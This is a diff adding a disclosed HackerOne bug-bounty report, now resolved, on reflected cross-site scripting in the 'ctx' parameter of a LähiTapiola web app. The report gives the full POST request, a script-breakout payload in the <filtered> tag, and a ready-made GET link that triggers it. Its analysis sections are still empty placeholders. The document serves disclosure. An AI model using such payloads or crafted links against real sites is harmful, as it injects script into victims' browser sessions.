@@ -1,0 +1,113 @@
+---
+source: hackerone
+dataset: elamaran619/hackerone_disclosed_reports
+h1_id: '191095'
+original_report_id: '191095'
+title: Reflected XSS on sankarikoulutus (viestinta.lahitapiola.fi)
+weakness: Cross-site Scripting (XSS) - Generic
+team_handle: localtapiola
+created_at: '2016-12-14T12:16:18.871Z'
+disclosed_at: '2017-01-25T00:27:39.183Z'
+has_bounty: true
+visibility: full
+substate: resolved
+vote_count: 9
+tags:
+- hackerone
+- cross-site-scripting-xss-generic
+---
+
+# Reflected XSS on sankarikoulutus (viestinta.lahitapiola.fi)
+
+## Metadata
+
+- HackerOne Report ID: 191095
+- Weakness: Cross-site Scripting (XSS) - Generic
+- Program: localtapiola
+- Disclosed At: 2017-01-25T00:27:39.183Z
+- Has Bounty: Yes
+- Visibility: full
+- Substate: resolved
+
+## Original Report
+
+## Basic report information
+**Summary:** 
+Hi,
+The **ctx** parameter in **http://viestinta.lahitapiola.fi/webApp/sankarikoulutus**, can be exploited to perform an XSS Attack.
+
+**Description:**
+When a user clicks on a map area, The following POST request is generated :
+
+```
+
+POST / HTTP/1.1
+Host: viestinta.lahitapiola.fi
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://viestinta.lahitapiola.fi/
+Cookie: _ga=GA1.2.1893977048.1481715220; _gat_UA-69988747-2=1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1209
+
+ctx=<ctx lang="en" date="2016-12-14T11:33:38Z" _target="web" webApp-id="71430420" _folderModel="nmsRecipient"><userInfo datakitInDatabase="true" homeDir="" instanceLocale="en-US" locale="en-US" login="webapp" loginCS="Web applications agent (webapp)" loginId="3290" noConsoleCnx="true" orgUnitId="0" theme="" timezone="Europe/Helsinki" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:xtk:session" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><login-right right="admin"/></userInfo><timezone current="Europe/Helsinki" changed="false"/><vars><filtered>1</filtered><company>LÃ¤nnen</company><eventId>0</eventId></vars><activityHistory><activity name="page2"/><activity name="query"/><activity name="script"/><activity name="start"/></activityHistory><events/></ctx>&userAction=next&transition=filter
+
+```
+
+After manually checking all the parameters within this request, I found that the value inside this tag **<filtered>value</filtered>** is not properly sanitized, which can be exploited to perform an XSS attack by using this payload:  **1){} alert(document.domain); if(1**.
+
+Furthermore this request can be changed from POST request to a GET, so an attacker can just send the following link to the victim to perform a successful attack.
+
+```
+http://viestinta.lahitapiola.fi/webApp/sankarikoulutus?ctx=<ctx lang="en" date="2016-12-12T15:26:28Z" _target="web" webApp-id="71599571" _folderModel="nmsRecipient"><userInfo datakitInDatabase="true" homeDir="" instanceLocale="en-US" locale="en-US" login="webapp" loginCS="Web applications agent (webapp)" loginId="3290" noConsoleCnx="true" orgUnitId="0" theme="" timezone="Europe/Helsinki" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:xtk:session" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><login-right right="admin"/></userInfo><timezone current="Europe/Helsinki" changed="false"/><vars><filtered>1111){} alert(document.domain); if(11</filtered><company>Satakunta</company><eventId>0</eventId></vars><activityHistory><activity name="page2"/><activity name="query"/><activity name="start"/></activityHistory><events/></ctx>&userAction=next&transition=filter
+```
+**Domain:** 
+viestinta.lahitapiola.fi
+viestinta.tapiola.fi 
+hjalteskolning.fi 
+sankarikoulu.fi 
+sankarikoulutus.fi 
+
+## Browsers / Apps Verified In:
+
+All Browsers
+
+## Steps To Reproduce:
+
+Just go to :
+  1.  
+http://viestinta.lahitapiola.fi/webApp/sankarikoulutus?ctx=<ctx lang="en" date="2016-12-12T15:26:28Z" _target="web" webApp-id="71599571" _folderModel="nmsRecipient"><userInfo datakitInDatabase="true" homeDir="" instanceLocale="en-US" locale="en-US" login="webapp" loginCS="Web applications agent (webapp)" loginId="3290" noConsoleCnx="true" orgUnitId="0" theme="" timezone="Europe/Helsinki" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:xtk:session" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><login-right right="admin"/></userInfo><timezone current="Europe/Helsinki" changed="false"/><vars><filtered>1111){} alert(document.domain); if(11</filtered><company>Satakunta</company><eventId>0</eventId></vars><activityHistory><activity name="page2"/><activity name="query"/><activity name="start"/></activityHistory><events/></ctx>&userAction=next&transition=filter
+
+## Additional material
+
+See Attached POC
+
+## Related reports, best practices
+
+  * [OWASP-recommendations]
+
+## Extracted Security Notes
+
+### Likely Vulnerability Class
+
+*Leave this section for future enrichment.*
+
+### Likely Root Cause
+
+*Leave this section for future enrichment.*
+
+### Potential Impact
+
+*Leave this section for future enrichment.*
+
+### Defensive Test Cases
+
+*Leave this section for future enrichment.*
+
+### Remediation Ideas
+
+*Leave this section for future enrichment.*
